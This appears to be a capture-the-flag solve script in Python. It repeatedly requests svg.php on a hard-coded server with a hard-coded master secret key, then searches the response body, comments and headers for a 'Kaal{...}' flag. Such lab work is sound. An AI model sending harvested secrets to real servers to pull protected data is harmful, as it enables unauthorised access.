#!/usr/bin/env python3
"""
Make multiple requests and check if any contain the flag directly
"""

import requests
import re
import time

BASE_URL = "http://138.199.163.92:12669"
SECRET = "Th1s_is_4_Str0ng_M4ster_Secret_Key_2026!!"

def rapid_requests():
    """Make requests and check for flag"""
    
    print("[*] Making requests to find flag...")
    
    for i in range(10):
        print(f"\n[*] Request {i+1}...")
        
        try:
            url = f"{BASE_URL}/svg.php?secret={SECRET}"
            resp = requests.get(url, timeout=10)
            
            print(f"    Status: {resp.status_code}, Length: {len(resp.text)}")
            
            # Check for flag directly in response
            if "Kaal{" in resp.text:
                print(f"[+] FLAG FOUND IN RESPONSE!")
                flags = re.findall(r'Kaal\{[^}]+\}', resp.text)
                for flag in flags:
                    print(f"[+] FLAG: {flag}")
                    return flag
            
            # Check for flag in comments
            comments = re.findall(r'<!--([^>]+)-->', resp.text)
            for comment in comments:
                if "Kaal{" in comment:
                    print(f"[+] FLAG IN COMMENT: {comment}")
                    return comment
            
            # Check response headers
            for header, value in resp.headers.items():
                if "Kaal{" in str(value):
                    print(f"[+] FLAG IN HEADER {header}: {value}")
                    return value
            
        except Exception as e:
            print(f"    Error: {e}")
        
        time.sleep(6)  # Wait to avoid rate limit
    
    return None

def main():
    print("=" * 60)
    print("Rapid Fire Flag Search")
    print("=" * 60)
    
    flag = rapid_requests()
    
    if flag:
        print(f"\n{'='*60}")
        print(f"SUCCESS! FLAG: {flag}")
        print(f"{'='*60}")
    else:
        print("\n[!] Flag not found in any response")

if __name__ == "__main__":
    main()
